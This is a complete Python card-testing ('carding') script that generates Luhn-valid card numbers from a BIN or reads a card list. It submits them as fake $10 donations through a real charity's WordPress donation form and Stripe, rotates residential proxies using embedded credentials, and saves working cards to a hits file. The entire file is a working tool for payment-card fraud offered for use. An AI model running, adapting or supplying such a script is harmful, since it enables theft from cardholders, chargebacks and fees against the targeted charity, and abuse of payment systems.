import random
import requests
from faker import Faker
from bs4 import BeautifulSoup
from colorama import Fore, Style
import uuid
import time
import json
import os
import threading

fake = Faker()

def generate_time_on_page():
    # 1.2 - 2.2 min in milliseconds
    min_ms = int(1.2 * 60 * 1000)
    max_ms = int(2.2 * 60 * 1000)
    return random.randint(min_ms, max_ms)

def generate_stripe_style_id():
    base_uuid = uuid.uuid4().hex[:32]
    extra = uuid.uuid4().hex[:8]
    ts = hex(int(time.time() * 1000))[2:]
    stripe_id = f"{base_uuid[:8]}-{base_uuid[8:12]}-{base_uuid[12:16]}-{base_uuid[16:20]}-{base_uuid[20:]}{extra}{ts}"
    return stripe_id

def getprox(existing=None,host="evo-pro.porterproxies.com",port=61236,s_len=12,p_len=8):
    import secrets,re,string; r=lambda n:''.join(secrets.choice(string.ascii_letters+string.digits) for _ in range(n))
    if existing: m=re.search(r'^(?:https?://)?(?P<user>[^:@]+:[^@]+)@(?P<host>[^:\/\s]+):(?P<port>\d+)',existing); user,passwd=(m.group('user').split(':',1) if m else ("PP_F8AR2T6V9E",r(p_len))); user=re.sub(r'(session-)[A-Za-z0-9_-]+',r'\1'+r(s_len),user) if 'session-' in user else f"PP_F8AR2T6V9E-session-{r(s_len)}"
    else: user=f"PP_F8AR2T6V9E-country-MY-session-{r(s_len)}"; passwd=r(p_len)
    return {"http":f"http://{user}:663bei24@{host}:{port}","https":f"http://{user}:{passwd}@{host}:{port}"}
    
# Stripe Checker
def check(card, month, year, cvc, proxy=None):
        session= requests.Session()
        print('[+] Transaction using:',f"{card}|{month}|{year}|{cvc}")
        try:
            html = session.get("https://smofi.org/donations/", proxies=proxy, timeout=6)
            soup = BeautifulSoup(html.text, 'html.parser')
            forms_id = soup.find('input', {'name': 'charitable_form_id'})["value"]
            nonce_id = soup.find('input', {'name': '_charitable_donation_nonce'})["value"]
            campa_id = soup.find('input', {'name': 'campaign_id'})["value"]
            mathi_id = str(eval(soup.find('label', {'for': 'charitable_field_charitable_spamblocker_math_field_element'}).text.replace('*', '').strip().split(': ')[1]))
            print("[+] Website data retrieved: {}-{}-{}-{}.".format(forms_id, nonce_id, campa_id, mathi_id))
            ii = str(random.choice(['gmail.com','hotmail.com','outlook.com','yandex.com','hmail.com']))
            web = {"form_id": forms_id, "nonce_id": nonce_id, "campaign_id": campa_id, "math_id": mathi_id}
            s_data = session.post("https://m.stripe.com/6", data={"key": "pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG"}, proxies=proxy, timeout=6)
            guid = s_data.json()["guid"]
            muid = s_data.json()["muid"]
            sid = s_data.json()["sid"]
            try:
                 data = {
                 "type": "card",
                 "billing_details[name]": fake.name(),
                 "billing_details[email]": str(fake.email()).replace('example.com',ii),
                 "card[number]": str(card),
                 "card[cvc]": str(cvc),
                 "card[exp_month]": str(month),
                 "card[exp_year]": str(year),
                 "guid": str(guid),
                 "muid": str(muid),
                 "sid": str(sid),
                 "pasted_fields": "number",
                 "payment_user_agent": "stripe.js/c669470a4e; stripe-js-v3/c669470a4e; card-element",
                 "referrer": "https://smofi.org",
                 "time_on_page": str(generate_time_on_page()),
                 "key": "pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG"
                 }
                 #print(data)
                 response = session.post("https://api.stripe.com/v1/payment_methods", data=data, proxies=proxy, timeout=6)
                 
                 if response.status_code == 200:
                       print("[+] Payment method retrieved: {}.".format(response.json()['id']))
                       stripe_payment_id = response.json()['id']
                       try:
                           data = {
                           "charitable_form_id": web["form_id"],
                           web["form_id"]: "",
                           "_charitable_donation_nonce": web["nonce_id"],
                           "_wp_http_referer": "/donations/",
                           "campaign_id": web["campaign_id"],
                           "description": "Donations to SMOFI",
                           "ID": "0",
                           "donation_amount": "custom",
                           "custom_donation_amount": "10.00",
                           "first_name": fake.first_name(),
                           "last_name": fake.last_name(),
                           "phone_number": fake.phone_number(),
                           "email": str(fake.email()).replace('example.com',ii),
                           "charitable_spamblocker_math_field": web["math_id"],
                           "address": fake.address(),
                           "donor_comment": "",
                           "gateway": "stripe",
                           "stripe_payment_method": stripe_payment_id,
                           "cover_fees": "1",
                           "action": "make_donation",
                           "form_action": "make_donation"
                           }
                           response = session.post("https://smofi.org/wp-admin/admin-ajax.php", data=data, proxies=proxy, timeout=6)
                           #print(response.text)
                           if response.json()["success"]:
                                tt = f"{card}|{month}|{year}|{cvc} -- {proxy}"
                                open('hits.txt','a').write(tt+'\n')
                                print("[+] Pushed payment successfully: {}.".format(response.json()["secret"]))
                                sec_id = response.json()["secret"]
                                try:
                                    payment_pi = sec_id.split("_secret_")[0]
                                    data = {
                                        "expected_payment_method_type": "card",
                                        "use_stripe_sdk": "true",
                                        "key": "pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG",
                                        "client_secret": payment_pi,
                                    }
                                    response = session.post(f"https://api.stripe.com/v1/payment_intents/{payment_pi}/confirm", data=data, proxies=proxy, timeout=6)
                                    if response.status_code == 200:
                                        print(Fore.GREEN + "[ðŸŸ¢] Payment confirmed: {}.\n".format(response.json()['status']))
                                        print(Style.RESET_ALL, end='')
                                        return f"Payment confirmed [{response.json()['status']}]."
                                    else:
                                        print(Fore.GREEN + "[ðŸŸ¢] Payment didn't confirmed: {}\n".format(response.json()["error"]["message"]))
                                        print(Style.RESET_ALL, end='')
                                        return "Payment pushed but didn't confirmed [" + response.json()["error"]["message"] + "]"
                                except:
                                    print(Fore.RED + "[Ã—] Payment Check error.\n")
                                    print(Style.RESET_ALL, end='')
                                    return None
                           else:
                               print("[Ã—] Errors:", Fore.RED + str(response.json()) + str(f"> {response.status_code}"))
                               print(Style.RESET_ALL, end='')
                       except Exception as e:
                           print(Fore.RED + f"[Ã—] Payment Pushing Error {str(e)}\n")
                           print(Style.RESET_ALL, end='')
                           return None
            except:
                 print(Fore.RED + "[Ã—] Failed to get payment id.\n")
                 print(Style.RESET_ALL, end='')
                 return None
        except:
            print(Fore.RED + "[Ã—] Failed to retrieve website data: HTTPSConnectionPool closed.\n")
            print(Style.RESET_ALL, end='')
            return None

# Global Proxylist
try:proxyl = open('proxy.txt','r').read().splitlines()
except:proxyl = ['','']

def make(bin_prefix, length=16):
    if int(len(bin_prefix)) == 16:
        return bin_prefix
    remaining_length = length - len(bin_prefix) - 1
    random_digits = ''.join(str(random.randint(0, 9)) for _ in range(remaining_length))
    partial_number = bin_prefix + random_digits
    digits = [int(d) for d in partial_number]
    for i in range(len(digits) - 1, -1, -2):
        doubled = digits[i] * 2
        digits[i] = doubled - 9 if doubled > 9 else doubled
    total_sum = sum(digits)
    checksum = (10 - (total_sum % 10)) % 10
    return partial_number + str(checksum)



def random_hit(bin,date=None,cvc=None):
     hh = random.choice(proxyl)
     if hh.strip() == '':
        proxy = None
     else:
        proxy = {'http': hh, 'https': hh}
     valid_card = make(bin_prefix=bin)
     sl = "|"
     try:
         mm,yy = date.split('|')
         if int(len(mm)) == 1:
            mm="0"+mm
         date = str(mm+sl+yy)

     except:
         mm = str(random.randint(1,12))
         if int(len(mm)) == 1:
           mm="0"+mm
         xx =mm  + '|' + str(random.randint(26,31))
         date=xx
     if not cvc:
         cvc = str(random.randint(100,999))
     cc = str(valid_card) + sl + date + sl + cvc
     card, month, year, cvc = cc.split('|')

     check(card, month, year, cvc, proxy=proxy)
     print('-'*50)


LOGO = r"""
    ___       __       __ ___ __ 
   / _ |__ __/ /____  / // (_) /_
  / __ / // / __/ _ \/ _  / / __/
 /_/ |_\_,_/\__/\___/_//_/_/\__/  (stripe) v/1
--------------------------------------------------
[>] Developer   : Dr. Professor
[>] Telegram    : @proffxor
--------------------------------------------------"""

def clear():
    os.system('cls' if os.name == 'nt' else "clear")
    print(LOGO)

def linex():
    print(Fore.GREEN+'--------------------------------------------------')
    print(Style.RESET_ALL, end='')

def bin_main():
     clear()
     bin = input("[>] Input Bin: ")
     if not int(len(str(bin))) >= 6:
           print('[!] Must use 6 dgt bin')
           exit()
     clear()
     print("[+] Note: Press enter for random")
     linex()
     date = input("[>] Date (mm|yy) : ")
     clear()
     print("[+] Note: Press enter for random")
     linex()
     cvc = input("[>] Input cvc: ")
     clear()
     #print("[+] Note: Try 5 to 10 to avoid block")
     #linex()
     #speed = int(input("[>] Crack speed : "))

     # Submit now
     clear()
     print("[+] Press Ctrl + Z to exit")
     linex()
     for gg in range(9999999):
           #for __ in range(8):
              random_hit(bin,date,cvc)
              #threading.Thread(target=random_hit,args=(bin,date,cvc,)).start()
           #time.sleep(5)

def combo_main():
     clear()
     xh = input("[>] Put combo path: ")
     hhh = open(xh, 'r').read().splitlines()
     for tt in hhh:
          try:
             bin, mm, yy, cvc = tt.split('|')
             if int(len(yy)) == 4:
                 yy = yy[2:]
             date = f"{mm}|{yy}"
             random_hit(bin,date,cvc)
          except:
             pass


def main():
    clear()
    print("[1] Crack by bin")
    print("[2] Combo crack ")
    linex()
    iii = input("[>] Select: ")
    if iii in ['1','a','A']:
         bin_main()
    elif iii in ['2','b','B']:
         combo_main()

main()
